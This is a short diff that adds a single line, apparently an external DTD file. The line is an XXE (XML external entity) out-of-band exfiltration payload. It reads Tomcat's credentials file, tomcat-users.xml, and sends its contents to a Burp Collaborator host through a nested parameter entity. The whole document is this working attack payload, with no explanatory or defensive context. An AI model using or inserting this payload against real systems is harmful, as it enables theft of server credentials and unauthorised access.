@@ -1,0 +1,2 @@
+<!ENTITY % payload SYSTEM "file:///opt/tomcat/conf/tomcat-users.xml"> <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://ague463n3w7vlamav1p9ypoy4pafy4.burpcollaborator.net/x=%payload;">'> %param1; %external;
+
